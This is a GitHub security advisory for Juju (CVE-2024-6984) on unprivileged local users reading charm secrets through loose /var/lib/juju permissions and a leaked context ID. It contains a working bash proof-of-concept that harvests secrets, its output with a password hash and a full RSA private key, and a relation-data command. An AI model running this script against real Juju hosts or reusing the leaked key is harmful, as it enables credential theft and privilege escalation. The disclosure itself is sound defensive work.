
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjuju%2Fjuju%2Fsecurity%2Fadvisories%2FGHSA-6vjm-54vp-mxhx)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fjuju%2Fjuju%2Fsecurity%2Fadvisories%2FGHSA-6vjm-54vp-mxhx)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=juju%2Fjuju)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[juju](/juju)
/
**[juju](/juju/juju)**
Public

* [Notifications](/login?return_to=%2Fjuju%2Fjuju) You must be signed in to change notification settings
* [Fork
  508](/login?return_to=%2Fjuju%2Fjuju)
* [Star
   2.4k](/login?return_to=%2Fjuju%2Fjuju)

* [Code](/juju/juju)
* [Issues
  4](/juju/juju/issues)
* [Pull requests
  33](/juju/juju/pulls)
* [Actions](/juju/juju/actions)
* [Security](/juju/juju/security)
* [Insights](/juju/juju/pulse)

Additional navigation options

* [Code](/juju/juju)
* [Issues](/juju/juju/issues)
* [Pull requests](/juju/juju/pulls)
* [Actions](/juju/juju/actions)
* [Security](/juju/juju/security)
* [Insights](/juju/juju/pulse)

# Unprivileged user running on charm node can leak any secret or relation data accessible to the local charm

High

[anvial](/anvial)
published
GHSA-6vjm-54vp-mxhx
Aug 5, 2024

## Package

No package listed

## Affected versions

>=3.0, <3.0

## Patched versions

2.9.50, 3.1.9, 3.3.6, 3.4.5, 3.5.3

## Description

### Summary

Where: on any given node running a charm. Did not try on k8s, but I would imagine that any user on the container OR on the underlying host can also perform this attack.

#### Criticality Rationale

I am setting this issue as critical, as one single compromised host in Juju may give arbitrary access, maybe even remote access, to a target application. Any access to any host would allow a malicious actor to do privilege abuse and escalation in the environment.

#### Explanation

The permissions on `/var/lib/juju/` are too broad and essentially let any unprivileged users leak any secret available on the local charm(s) (*Details point 1.*).

For a demo, I've created an unprivileged user in the host:

```
ubuntu@juju-a6bfe1-8:~$ sudo mkdir -p /home/unpriv
ubuntu@juju-a6bfe1-8:~$ sudo useradd unpriv_user
ubuntu@juju-a6bfe1-8:~$ sudo chown -R unpriv_user:unpriv_user /home/unpriv
ubuntu@juju-a6bfe1-8:~$ sudo usermod unpriv_user -d /home/unpriv
ubuntu@juju-a6bfe1-8:~$ sudo su - unpriv_user

```

Once under `unpriv_user`, I've crafted a quick script:

```
#!/usr/bin/bash

while true; do
    if [ "JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids | grep -q 'bad request: expected context id '" ]; then
        context_id=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=0 /var/lib/juju/tools/unit-opensearch-4/secret-ids 2>&1 | awk -F"\"" '{print $2}')
        echo $context_id
        echo "Now get the secrets:"
        secret=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID="$context_id" /var/lib/juju/tools/unit-opensearch-4/secret-ids | head -n 1)
        echo "Target secret is: $secret"
        value=$(JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID="$context_id" /var/lib/juju/tools/unit-opensearch-4/secret-get $secret)
        echo "$value"
    fi
    sleep 5s
done

```

When executing the script above, I get:

First, the script tries in vain to recover the JUJU\_CONTEXT\_ID:

```
Now get the secrets:
ERROR JUJU_CONTEXT_ID not set
Target secret is:
ERROR JUJU_CONTEXT_ID not set

Now get the secrets:
ERROR JUJU_CONTEXT_ID not set
Target secret is:
ERROR JUJU_CONTEXT_ID not set

```

Then, once a hook happens at the host, I can see the context id, that is leaked as part of the error message, and use it to leak any of the secrets available:

```
opensearch/4-update-status-6650616701636989502
Now get the secrets:
Target secret is: cqcdo3i8l9fjmtptgrvg
kibanaserver-password-hash: $2b$12$kFsUqJiAM3fnonenAbOmJ.OJdhAgJjaodbx9ia2V0SCNHTp./r65e

```

......

and it also leaks the private key:

```
key: |
  -----BEGIN RSA PRIVATE KEY-----
  MIIEpAIBAAKCAQEAoK4J9n1091bGcQtlFkXFJCOksRq5pcCzeTBjccar2ZdEWCNU
  UWctZO8r7DU5r4cwNjS9jafouAzmP07dd40LuwN3Uedj1c3+mPPf1AUkTWm/O0tO
  It/c1+ym/0oTxsdYXI2DWPa5Ni433luXP9myki9P3HZrUDy9FniE2PnOv2u2TIeh
  3uzsktc/PvbdGkLg5KVnIVC6CmSUAPMim/RGU9KTYL4bTG4aH0zs5d6b13eN7bMI
  tSwmutUfSyZYcgJbWgAsVIsti8cfcbAEvMUREkCze/FJHJyxrKuctt8Vfo+nPqKF
  tZe88Mnl2aS+22+D9j2XRCi969jBJKpxN0Y4cwIDAQABAoIBADk/iQEvldsCKdXh
  D3UuCp1jrawEL5zk2Y0WNng1Jslx4cHdZI9USZIqvOV92T221vCZPegYqQvaXLa1
  rKaJtGI/S+X8oU9uA4YPbfImmtaSFLZVkFNQm2i7Qoy2ofEy2UKwkNnDnh21veYV
  kAAJ2lvHS5brAjUmTuCQtBRyfL0qXBQTMACy6PUIgynGm/zP3DxAxCcA2IBhcuEx
  xHaMwmdQBewR3zW6oOXLyBg10SV9iYhArO7JKRnWJGPpploT2AQu4uH4H3mMWMN5
  wkT/t084Xpt8wPLmcKB2+B4muQhKhQUuHRXzTeAh1E6h0tPmRRkg9mWQ6VZFHEgi
  YzivJ8ECgYEA4KH/Doos4m6G1eL587YBbBh/SOklmH5yB83AAMn7wYqYnQ8+qhX/
  L8uF5u0Pm2v1H09eVGlg66POUPdtwx0QBA0r9i5NfBCVdjGHSdRFxg35MTb0qYBd
  9E6pCWhrpPWbwKPxgjpqN8iW6Vi0xnKiERj1CIE8fWvlLzDRg6AVpNECgYEAtx3m
  iF5jW200tyHGEwmneNSwhJ83IXINTpPZA906Wwku8PH2mj4nRbcUCGfqJ5FN8vks
  R4sH55SL0Ff/E4w5E738PSgdnrF3O5KfHioPSRlKAq08VtDa6Q7msxauTRbqECM9
  2Vu63WBWBWxH0Q2YZVeG4USFKY0PGslYWqULKgMCgYAWel9pdw4ywlifwoy8hHPz
  +yeRhjMK5WxHt6EE8zFMFrBa1xGwN29Huxf1Gbe8F7t5nJmV3M2kBso4c+n54kid
  /yttAQkj5wztvNsK2kD5JqDO+e7Vn1DHh6+Gj3pmEWW6iy05mNrUJjBjvUqpqQLq
  rxKl/TiuXEOcy0fL4hMIYQKBgQCwdhT5JxRSP4vESrypDe2gSD4On6uuBE2Egn9n
  9OHOZqwgrtt4yhpoWUPp0dHY7XKTicE89GLarNCLJrF9cexy9OtFOApLKjN/ag0C
  MX/nboJez/hMpRm/64cv39R6H3HRuVRZyMbrnHFo6m7Oq25HgrBNFw3H+9Ipeww0
  1cVLZwKBgQC/O1twahHzdP5nbuXBe5vKpiqPaw51y/xAF+z0EFG9gUAfvwqAm5JN
  4OFpNDlGhkagbSoGffynMvPYYT7qnS+i8bJVL3qWzND4pERVP2bZiQCyN6Pbnnvr
  jx4p78wx72ZbLGvf2TXWlqRNAUNhs4dJrUf4bqW1bmBVPzRxsGdWJQ==
  -----END RSA PRIVATE KEY-----

```
### Details

#### 1. File permissions seen from `unpriv_user`:

```
unpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/agents/
total 16
drwxr-xr-x 4 root root 4096 Jul 18 09:05 .
drwxr-xr-x 7 root root 4096 Jul 18 09:05 ..
drwxr-xr-x 2 root root 4096 Jul 18 09:05 machine-8
drwxr-xr-x 4 root root 4096 Jul 18 09:05 unit-opensearch-4
unpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/agents/unit-opensearch-4/
total 20
drwxr-xr-x 4 root root 4096 Jul 18 09:05 .
drwxr-xr-x 4 root root 4096 Jul 18 09:05 ..
-rw------- 1 root root 2055 Jul 18 09:05 agent.conf
drwxr-xr-x 6 root root 4096 Jul 18 09:39 charm
srwx------ 1 root root    0 Jul 18 09:05 metrics-send.socket
srwx------ 1 root root    0 Jul 18 09:05 run.socket
drwxr-xr-x 4 root root 4096 Jul 18 09:05 state
unpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/agents/unit-opensearch-4/charm/
total 108
drwxr-xr-x  6 root root  4096 Jul 18 09:39 .
drwxr-xr-x  4 root root  4096 Jul 18 09:05 ..
-rw-r--r--  1 root root    25 Jul 18 09:05 .juju-charm
-rw-------  1 root root 24576 Jul 18 09:39 .unit-state.db
-rw-r--r--  1 root root 11345 Jul 18 09:05 LICENSE
-rw-r--r--  1 root root  4370 Jul 18 09:05 README.md
-rw-r--r--  1 root root  2776 Jul 18 09:05 actions.yaml
-rw-r--r--  1 root root    10 Jul 18 09:05 charm_version
-rw-r--r--  1 root root  1713 Jul 18 09:05 config.yaml
-rwxr-xr-x  1 root root   102 Jul 18 09:05 dispatch
drwxr-xr-x  2 root root  4096 Jul 18 09:05 hooks
-rw-r--r--  1 root root  1127 Jul 18 09:05 icon.svg
drwxr-xr-x  3 root root  4096 Jul 18 09:05 lib
-rw-r--r--  1 root root   250 Jul 18 09:05 manifest.yaml
-rw-r--r--  1 root root  1404 Jul 18 09:05 metadata.yaml
-rw-r--r--  1 root root     1 Jul 18 09:06 revision
drwxr-xr-x  5 root root  4096 Jul 18 09:06 src
drwxr-xr-x 73 root root  4096 Jul 18 09:06 venv
-rw-r--r--  1 root root     7 Jul 18 09:06 workload_version
unpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/tools/unit-opensearch-4
lrwxrwxrwx 1 root root 38 Jul 18 09:05 /var/lib/juju/tools/unit-opensearch-4 -> /var/lib/juju/tools/3.4.4-ubuntu-amd64
unpriv_user@juju-a6bfe1-8:~$ ls -la /var/lib/juju/tools/unit-opensearch-4/
total 199732
drwxr-xr-x 2 root root      4096 Jul 18 09:05 .
drwxr-xr-x 3 root root      4096 Jul 18 09:05 ..
lrwxrwxrwx 1 root root        44 Jul 18 09:05 action-fail -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 action-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 action-log -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 action-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 add-metric -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 application-version-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 close-port -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 config-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 credential-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
-rw-r--r-- 1 root root       229 Jul 18 09:05 downloaded-tools.txt
lrwxrwxrwx 1 root root        44 Jul 18 09:05 goal-state -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 is-leader -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 juju-log -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 juju-reboot -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
-rwxrwxr-x 1 root root   4911104 Jun 21 07:12 jujuc
-rwxr-xr-x 1 root root 199594256 Jun 21 07:17 jujud
lrwxrwxrwx 1 root root        44 Jul 18 09:05 k8s-raw-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 k8s-raw-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 k8s-spec-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 k8s-spec-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 leader-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 leader-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 network-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 open-port -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 opened-ports -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 payload-register -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 payload-status-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 payload-unregister -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 pod-spec-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 pod-spec-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 relation-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 relation-ids -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 relation-list -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 relation-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 resource-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-add -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-grant -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-ids -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-info-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-remove -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-revoke -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 secret-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 state-delete -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 state-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 state-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 status-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 status-set -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 storage-add -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 storage-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 storage-list -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc
lrwxrwxrwx 1 root root        44 Jul 18 09:05 unit-get -> /var/lib/juju/tools/3.4.4-ubuntu-amd64/jujuc

```
### PoC

1. Deploy any model
2. Access one of the hosts
3. Run the script above

### Impact

It is easy to have privileged escalation,as secrets will contain sensitive information of any workloads.

### Juju < 3.0

I also can get relation information from:

```
$ JUJU_AGENT_SOCKET_NETWORK=unix JUJU_AGENT_SOCKET_ADDRESS=@/var/lib/juju/agents/unit-opensearch-4/agent.socket JUJU_CONTEXT_ID=opensearch/4-update-status-6650616701636989502 /var/lib/juju/tools/unit-opensearch-4/relation-ids certificates
certificates:11

```

However, I did not extend the attack to count for this scenario, but I believe it is also doable.

### Potential Solutions

First, we must not leak the JUJU\_CONTEXT\_ID as part of the error message. That will mean from now on, an user will have "guess" that value and it changes every time.

In any case, we must also limit the rights within `/var/lib/juju` to root-only. I cannot see a reason to have it with such wide permissions.

### Severity

High

8.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

### CVE ID

CVE-2024-6984

### Weaknesses

[CWE-209](/advisories?query=cwe%3A209) [CWE-269](/advisories?query=cwe%3A269) [CWE-284](/advisories?query=cwe%3A284)

### Credits

* [![@phvalguima](https://avatars.githubusercontent.com/u/31036845?s=40&v=4)](/phvalguima)
  [phvalguima](/phvalguima)
  Reporter
* [![@manadart](https://avatars.githubusercontent.com/u/562661?s=40&v=4)](/manadart)
  [manadart](/manadart)
  Remediation developer
* [![@SimonRichardson](https://avatars.githubusercontent.com/u/2562584?s=40&v=4)](/SimonRichardson)
  [SimonRichardson](/SimonRichardson)
  Remediation reviewer
* [![@hpidcock](https://avatars.githubusercontent.com/u/4424127?s=40&v=4)](/hpidcock)
  [hpidcock](/hpidcock)
  Remediation reviewer
* [![@lucistanescu](https://avatars.githubusercontent.com/u/17014534?s=40&v=4)](/lucistanescu)
  [lucistanescu](/lucistanescu)
  Coordinator
* [![@eslerm](https://avatars.githubusercontent.com/u/16212934?s=40&v=4)](/eslerm)
  [eslerm](/eslerm)
  Coordinator

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

